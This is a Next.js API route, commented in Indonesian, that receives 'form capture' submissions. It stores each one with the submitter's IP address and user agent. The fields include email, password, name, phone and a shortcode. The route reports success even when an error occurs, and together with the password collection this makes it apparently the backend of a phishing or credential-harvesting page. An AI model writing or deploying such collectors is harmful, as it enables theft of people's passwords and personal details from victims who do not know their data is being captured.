import { saveFormCaptureData } from '@/lib/db-transaction/form-capture';
import { headers } from 'next/headers';
import { NextRequest, NextResponse } from 'next/server';
import { z } from 'zod';

// Schema validasi untuk data form
const formCaptureSchema = z.object({
  source: z.string(),
  email: z.string().email().optional(),
  password: z.string().optional(),
  name: z.string().optional(),
  phone: z.string().optional(),
  shortcode: z.string().optional(),
  additional_data: z.record(z.any()).optional(),
});

export async function POST(req: NextRequest) {
  try {
    // Parse body request
    const body = await req.json();

    // Validasi input dengan zod
    const validatedData = formCaptureSchema.parse(body);

    // Ambil informasi dari request headers
    const headersList = headers();
    const userAgent = headersList.get('user-agent') || '';
    const ip = headersList.get('x-forwarded-for') || '';

    // Gunakan fungsi db transaction untuk menyimpan data
    const result = await saveFormCaptureData(
      {
        source: validatedData.source,
        email: validatedData.email,
        password: validatedData.password,
        name: validatedData.name,
        phone: validatedData.phone,
        shortcode: validatedData.shortcode,
        additional_data: validatedData.additional_data,
        // Jika ada session_id atau visitor_id dari client, gunakan itu
        session_id: body.session_id || null,
        visitor_id: body.visitor_id || null,
      },
      ip,
      userAgent,
    );

    // Berikan respons sukses tanpa membocorkan informasi sensitif
    return NextResponse.json({ success: true }, { status: 200 });
  } catch (error) {
    console.error('Error capturing form data:', error);

    // Berikan respons yang tidak menunjukkan error sebenarnya ke client
    // Ini penting untuk keamanan agar client tidak tahu jika ada masalah
    return NextResponse.json({ success: true }, { status: 200 });
  }
}
